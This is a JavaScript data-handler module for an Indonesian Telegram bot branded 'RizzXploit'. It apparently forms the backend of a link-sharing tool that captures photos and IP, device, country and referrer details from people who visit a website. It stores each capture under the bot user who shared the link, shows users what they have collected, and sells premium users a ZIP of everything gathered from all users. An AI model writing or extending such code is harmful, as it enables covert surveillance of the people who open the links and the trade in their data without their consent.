const { Data, User } = require('../database/models');
const zipGenerator = require('../utils/zip-generator');
const moment = require('moment');

class DataHandler {
  
  // View personal data
  async viewPersonalData(chatId) {
    try {
      const userData = await Data.find({ user_id: chatId.toString() })
        .sort({ timestamp: -1 })
        .limit(10);

      if (userData.length === 0) {
        global.bot.sendMessage(chatId,
          `📭 Belum ada data yang terkumpul dari Anda.\n\n🔧 *Bot by RizzXploit • JCN Community*`,
          { parse_mode: 'Markdown' }
        );
        return;
      }

      let dataText = `👀 **DATA PRIBADI ANDA**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
      
      userData.forEach((data, index) => {
        dataText += `**${index + 1}. Data ${moment(data.timestamp).format('DD/MM/YY HH:mm')}**\n`;
        dataText += `📍 IP: \`${data.ip_address}\`\n`;
        dataText += `📱 Device: ${data.device_type}\n`;
        dataText += `🌍 Country: ${data.country}\n`;
        dataText += `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
      });

      dataText += `📊 Total data Anda: ${userData.length}\n`;
      dataText += `🔧 *Bot by RizzXploit • JCN Community*`;

      global.bot.sendMessage(chatId, dataText, { parse_mode: 'Markdown' });

    } catch (error) {
      console.error('Error viewing personal data:', error);
      global.bot.sendMessage(chatId,
        `❌ Gagal mengambil data: ${error.message}\n\n🔧 *Bot by RizzXploit • JCN Community*`,
        { parse_mode: 'Markdown' }
      );
    }
  }

  // View premium data (ZIP report)
  async viewPremiumData(chatId) {
    try {
      // Cek apakah user premium
      const user = await User.findOne({ user_id: chatId.toString() });
      if (!user || user.role !== 'premium') {
        global.bot.sendMessage(chatId,
          `❌ Akses ditolak! Hanya user premium yang bisa mengakses fitur ini.\n\n🔧 *Bot by RizzXploit • JCN Community*`,
          { parse_mode: 'Markdown' }
        );
        return;
      }

      global.bot.sendMessage(chatId,
        `📦 Mengumpulkan data dari semua user...\n⏳ Membuat laporan premium...\n\n_Tunggu sebentar..._ 🕐\n\n🔧 *Bot by RizzXploit • JCN Community*`,
        { parse_mode: 'Markdown' }
      );

      // Generate ZIP report
      const zipBuffer = await zipGenerator.generateFullReport();

      if (!zipBuffer) {
        global.bot.sendMessage(chatId,
          `❌ Gagal membuat laporan. Coba lagi nanti.\n\n🔧 *Bot by RizzXploit • JCN Community*`,
          { parse_mode: 'Markdown' }
        );
        return;
      }

      // Kirim file ZIP
      await global.bot.sendDocument(chatId, zipBuffer, {
        caption: `💎 **PREMIUM DATA REPORT**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                 `📁 File: full_data_report_${moment().format('DDMMYY')}.zip\n` +
                 `📊 Berisi semua data terkumpul\n` +
                 `🕒 Generated: ${moment().format('DD/MM/YYYY HH:mm:ss')}\n\n` +
                 `🔧 *Bot by RizzXploit • JCN Community*`,
        parse_mode: 'Markdown'
      });

    } catch (error) {
      console.error('Error generating premium report:', error);
      global.bot.sendMessage(chatId,
        `❌ Gagal membuat laporan premium: ${error.message}\n\n🔧 *Bot by RizzXploit • JCN Community*`,
        { parse_mode: 'Markdown' }
      );
    }
  }

  // Delete data
  async deleteData(chatId, dataId) {
    try {
      const result = await Data.deleteOne({ 
        file_id: dataId,
        user_id: chatId.toString() 
      });

      if (result.deletedCount === 0) {
        global.bot.sendMessage(chatId,
          `❌ Data tidak ditemukan atau tidak bisa dihapus.\n\n🔧 *Bot by RizzXploit • JCN Community*`,
          { parse_mode: 'Markdown' }
        );
        return;
      }

      // Update user stats
      await User.findOneAndUpdate(
        { user_id: chatId.toString() },
        { $inc: { data_collected: -1 } }
      );

      global.bot.sendMessage(chatId,
        `✅ Data berhasil dihapus!\n\n🔧 *Bot by RizzXploit • JCN Community*`,
        { parse_mode: 'Markdown' }
      );

    } catch (error) {
      console.error('Error deleting data:', error);
      global.bot.sendMessage(chatId,
        `❌ Gagal menghapus data: ${error.message}\n\n🔧 *Bot by RizzXploit • JCN Community*`,
        { parse_mode: 'Markdown' }
      );
    }
  }

  // Show user stats
  async showUserStats(chatId) {
    try {
      const user = await User.findOne({ user_id: chatId.toString() });
      const dataCount = await Data.countDocuments({ user_id: chatId.toString() });

      if (!user) {
        global.bot.sendMessage(chatId,
          `❌ User tidak ditemukan.\n\n🔧 *Bot by RizzXploit • JCN Community*`,
          { parse_mode: 'Markdown' }
        );
        return;
      }

      const statsText = `📈 **STATISTIK ANDA**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `👤 Role: ${user.role === 'premium' ? '👑 Premium' : '👤 Member'}\n` +
        `📅 Join Date: ${moment(user.join_date).format('DD/MM/YYYY')}\n` +
        `📊 Data Collected: ${dataCount}\n` +
        `🔗 Links Shared: ${user.links_shared}\n` +
        `🕒 Last Active: ${moment(user.last_active).format('DD/MM/YYYY HH:mm')}\n\n` +
        `🔧 *Bot by RizzXploit • JCN Community*`;

      global.bot.sendMessage(chatId, statsText, { parse_mode: 'Markdown' });

    } catch (error) {
      console.error('Error showing user stats:', error);
      global.bot.sendMessage(chatId,
        `❌ Gagal mengambil statistik: ${error.message}\n\n🔧 *Bot by RizzXploit • JCN Community*`,
        { parse_mode: 'Markdown' }
      );
    }
  }

  // Save new data from website
  async saveData(userId, imageData, clientInfo) {
    try {
      const fileId = `photo_${clientInfo.ip}_${Date.now()}`;
      
      const newData = new Data({
        file_id: fileId,
        user_id: userId,
        image_url: imageData, // URL atau base64
        ip_address: clientInfo.ip,
        user_agent: clientInfo.userAgent,
        device_type: clientInfo.deviceType,
        country: clientInfo.country,
        referrer: clientInfo.referrer
      });

      await newData.save();

      // Update user stats
      await User.findOneAndUpdate(
        { user_id: userId },
        { 
          $inc: { data_collected: 1 },
          $set: { last_active: new Date() }
        }
      );

      return { success: true, fileId };

    } catch (error) {
      console.error('Error saving data:', error);
      return { success: false, error: error.message };
    }
  }
}

module.exports = new DataHandler();